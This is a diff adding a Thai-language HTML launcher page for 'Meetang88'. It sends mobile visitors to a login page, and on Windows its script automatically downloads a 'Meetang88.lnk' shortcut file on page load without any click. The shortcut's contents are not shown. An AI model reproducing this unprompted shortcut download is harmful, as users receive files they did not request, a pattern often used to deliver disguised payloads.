@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>เปิด Meetang88</title>
+    <link rel="icon" href="https://meetang88th.com/static/img/site-logo.webp">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
+        body { background: linear-gradient(135deg, #0D7C4F, #0A5F3C); min-height: 100vh; display: flex; align-items: center; justify-content: center; color: #FFF; text-align: center; padding: 20px; }
+        .container { max-width: 400px; }
+        .logo { width: 120px; height: 120px; margin: 0 auto 24px; border-radius: 28px; overflow: hidden; box-shadow: 0 8px 24px rgba(0,0,0,.3); }
+        .logo img { width: 100%; height: 100%; object-fit: cover; }
+        h1 { font-size: 32px; margin-bottom: 16px; font-weight: 600; }
+        p { font-size: 16px; opacity: 0.9; margin-bottom: 24px; }
+        .btn { background: #FFF; color: #0D7C4F; border: none; padding: 16px 40px; font-size: 18px; font-weight: 600; border-radius: 8px; cursor: pointer; display: inline-block; text-decoration: none; margin: 8px; }
+        .spinner { border: 4px solid rgba(255,255,255,.3); border-top: 4px solid #FFF; border-radius: 50%; width: 48px; height: 48px; animation: spin 1s linear infinite; margin: 24px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://meetang88th.com/static/img/site-logo.webp" alt="Meetang88">
+        </div>
+        <h1>Meetang88</h1>
+        <p id="message">กำลังเปิดแอพ...</p>
+        <div class="spinner" id="spinner"></div>
+        <div id="buttons" style="display: none;">
+            <a href="https://meetang88th.com/login" class="btn">เปิดเว็บ</a>
+            <a href="Meetang88.lnk" class="btn" download>ดาวน์โหลดไฟล์ Windows</a>
+        </div>
+    </div>
+
+    <script>
+        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        const isWindows = /Windows/i.test(navigator.userAgent);
+        const message = document.getElementById('message');
+        const spinner = document.getElementById('spinner');
+        const buttons = document.getElementById('buttons');
+
+        if (isMobile) {
+            // บนมือถือ - เปิดเว็บทันที
+            message.textContent = 'กำลังเปิด Meetang88...';
+            setTimeout(() => {
+                window.location.href = 'https://meetang88th.com/login';
+            }, 1000);
+        } else if (isWindows) {
+            // บน Windows - ดาวน์โหลด .lnk
+            message.textContent = 'กำลังดาวน์โหลดไฟล์...';
+            setTimeout(() => {
+                const link = document.createElement('a');
+                link.href = 'Meetang88.lnk';
+                link.download = 'Meetang88.lnk';
+                link.click();
+                
+                spinner.style.display = 'none';
+                message.textContent = 'ดาวน์โหลดเสร็จแล้ว!';
+                setTimeout(() => {
+                    window.location.href = 'https://meetang88th.com/login';
+                }, 2000);
+            }, 1000);
+        } else {
+            // อื่นๆ - แสดงปุ่มให้เลือก
+            spinner.style.display = 'none';
+            message.textContent = 'เลือกวิธีเปิด Meetang88';
+            buttons.style.display = 'block';
+        }
+    </script>
+</body>
+</html>
